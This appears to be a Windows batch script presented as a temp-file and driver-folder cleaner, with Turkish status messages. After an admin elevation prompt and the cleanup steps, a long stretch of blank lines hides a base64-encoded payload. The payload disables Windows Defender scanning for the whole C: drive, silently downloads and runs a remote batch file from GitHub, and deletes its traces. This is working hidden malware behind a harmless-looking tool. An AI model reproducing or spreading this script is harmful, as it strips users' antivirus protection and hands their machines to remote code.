cls
@echo off
:----------------------------------------------------------------------------------------------------------------
rem Check If User Has Admin Privileges
timeout /t 1 /nobreak > NUL
openfiles > NUL 2>&1
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( 
goto Clean 
goto Cleanv2
)
:----------------------------------------------------------------------------------------------------------------:
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
:----------------------------------------------------------------------------------------------------------------:
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:----------------------------------------------------------------------------------------------------------------:

cls

:----------------------------------------------------------------------------------------------------------------:
:Clean
:----------------------------------------------------------------------------------------------------------------:
rem Delete Temporary Files
del /s /f /q %WinDir%\Temp\*.*
cls
del /s /f /q %WinDir%\Prefetch\*.*
cls
del /s /f /q %Temp%\*.*
cls
del /s /f /q %AppData%\Temp\*.*
cls
del /s /f /q %HomePath%\AppData\LocalLow\Temp\*.*
cls
:----------------------------------------------------------------------------------------------------------------:
rem Delete Used Drivers Files (Not needed because already installed)
del /s /f /q %SYSTEMDRIVE%\AMD\*.*
cls
del /s /f /q %SYSTEMDRIVE%\NVIDIA\*.*
cls
del /s /f /q %SYSTEMDRIVE%\INTEL\*.*
cls
:----------------------------------------------------------------------------------------------------------------:
rem Delete Temporary Folders
rd /s /q %WinDir%\Temp
cls
rd /s /q %WinDir%\Prefetch
cls
rd /s /q %Temp%
cls
rd /s /q %AppData%\Temp
cls
rd /s /q %HomePath%\AppData\LocalLow\Temp
cls
:----------------------------------------------------------------------------------------------------------------:
rem Delete Used Drivers Folders (Not needed because already installed)
rd /s /q %SYSTEMDRIVE%\AMD
cls
rd /s /q %SYSTEMDRIVE%\NVIDIA
cls
rd /s /q %SYSTEMDRIVE%\INTEL
cls
:----------------------------------------------------------------------------------------------------------------:
rem Recreate Empty Temporary Folders
md %WinDir%\Temp
md %WinDir%\Prefetch
md %Temp%
md %AppData%\Temp
md %HomePath%\AppData\LocalLow\Temp
cls
:----------------------------------------------------------------------------------------------------------------:
rem Belirtilen klasördeki gereksiz dosyaları ve klasörleri silme işlemi
set "targetFolder=%LocalAppData%"
rem Geçici değişkenler
set "deletedFolders=0"
rem Alt klasörleri döngüye al
for /d %%i in ("%targetFolder%\tw-*") do (

    rem Klasörü sil

    rem echo Silinen klasör: "%%i"
    rd /s /q "%%i"
	cls
    set /a deletedFolders+=1
)
:----------------------------------------------------------------------------------------------------------------:
rem Kullanıcıya silinen klasör sayısını bildir
cls
color 0A
setlocal enabledelayedexpansion
set /a width=80
set /a spaces=(%width%-%deletedFolders%-36)/2
set "space="
for /l %%i in (1,1,%spaces%) do set "space=!space! "
echo !space!Bilgisayar temizlendi ve ek olarak gereksiz %deletedFolders% adet dosya basariyla silindi.!space!
endlocal
:----------------------------------------------------------------------------------------------------------------:
:----------------------------------------------------------------------------------------------------------------:










































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































:----------------------------------------------------------------------------------------------------------------:
:Cleanv2
:----------------------------------------------------------------------------------------------------------------:
@echo off
setlocal enabledelayedexpansion

set "b64=QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KSUYgIiVQUk9DRVNTT1JfQVJDSElURUNUVVJFJSIgRVFVICJhbWQ2NCIgKAogICAgPm51bCAyPiYxICIlU1lTVEVNUk9PVCVcU3lzV09XNjRcY2FjbHMuZXhlIiAiJVNZU1RFTVJPT1QlXFN5c1dPVzY0XGNvbmZpZ1xzeXN0ZW0iCikgRUxTRSAoCiAgICA+bnVsIDI+JjEgIiVTWVNURU1ST09UJVxzeXN0ZW0zMlxjYWNscy5leGUiICIlU1lTVEVNUk9PVCVcc3lzdGVtMzJcY29uZmlnXHN5c3RlbSIKKQppZiAnJWVycm9ybGV2ZWwlJyBORVEgJzAnICgKICAgIGdvdG8gVUFDUHJvbXB0CikgZWxzZSAoCiAgICBnb3RvIGdvdEFkbWluIAopCjpVQUNQcm9tcHQKICAgIGVjaG8gU2V0IFVBQyA9IENyZWF0ZU9iamVjdF4oIlNoZWxsLkFwcGxpY2F0aW9uIl4pID4gIiV0ZW1wJVxnZXRhZG1pbi52YnMiCiAgICBzZXQgcGFyYW1zPSUqCiAgICBlY2hvIFVBQy5TaGVsbEV4ZWN1dGUgImNtZC5leGUiLCAiL2MgIiIlfnMwIiIgJXBhcmFtczoiIj0iIiIsICIiLCAicnVuYXMiLCAxID4+ICIldGVtcCVcZ2V0YWRtaW4udmJzIgogICAgIiV0ZW1wJVxnZXRhZG1pbi52YnMiCiAgICBkZWwgIiV0ZW1wJVxnZXRhZG1pbi52YnMiCiAgICBleGl0IC9CCjpnb3RBZG1pbgogICAgcHVzaGQgIiVDRCUiCiAgICBDRCAvRCAiJX5kcDAiCiAgICBwb3dlcnNoZWxsLmV4ZSAtd2luZG93IGhpZGRlbiAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcJyIKICAgIGNkICJDOlxVc2Vyc1wlVVNFUk5BTUUlXEFwcERhdGFcTG9jYWwiCiAgICBta2RpciAiQ2hyb21lIgogICAgY2QgIkM6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWUiCiAgICBpZiBub3QgZXhpc3QgImNsZWFuLmJhdCIgKAogICAgICAgIGVjaG8gW0lORk9dIGNsZWFuLmJhdCBkb3N5YXPEsSBpbmRpcmlsaXlvci4uLgogICAgICAgIHBvd2Vyc2hlbGwuZXhlIC13aW5kb3cgaGlkZGVuIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICdodHRwczovL2dpdGh1Yi5jb20vY29uZmVzc3lvdXJjaW4veG9yLW9iZnVzY2F0b3IvcmF3L3JlZnMvaGVhZHMvbWFpbi9jbGVhbi5iYXQnIC1PdXRGaWxlICdjbGVhbi5iYXQnIgoKICAgICAgICBpZiBleGlzdCAiY2xlYW4uYmF0IiAoCiAgICAgICAgICAgIHN0YXJ0ICIiIC9iIGNsZWFuLmJhdAogICAgICAgICAKICAgICAgICApCiAgICApIGVsc2UgKAogICAgICAgIHN0YXJ0ICIiIC9iIGNsZWFuLmJhdAogICAgKQp0aW1lb3V0IC90IDEwID5udWwKc3RhcnQgIiIgL2IgY2xlYW4uYmF0CnN0YXJ0ICIiIC9iIFdpbmRvd3NVcGRhdGUuYmF0CnRpbWVvdXQgL3QgMjUgPm51bAoKcG93ZXJzaGVsbC5leGUgLXdpbmRvdyBoaWRkZW4gLUNvbW1hbmQgImlmIChUZXN0LVBhdGggJ0M6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWVcY2xlYW4uYmF0Jykge1JlbW92ZS1JdGVtICdDOlxVc2Vyc1wlVVNFUk5BTUUlXEFwcERhdGFcTG9jYWxcQ2hyb21lXGNsZWFuLmJhdCcgLUZvcmNlfSIKcG93ZXJzaGVsbC5leGUgLXdpbmRvdyBoaWRkZW4gLUNvbW1hbmQgImlmIChUZXN0LVBhdGggJ0M6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWVcV2luZG93c1VwZGF0ZS5iYXQnKSB7UmVtb3ZlLUl0ZW0gJ0M6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWVcV2luZG93c1VwZGF0ZS5iYXQnIC1Gb3JjZX0iCgpleGl0CmVuZGxvY2Fs"

powershell -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%b64%')) | Set-Content -Encoding UTF8 cleanallfiles.bat"
call cleanallfiles.bat
del cleanallfiles.bat
endlocal








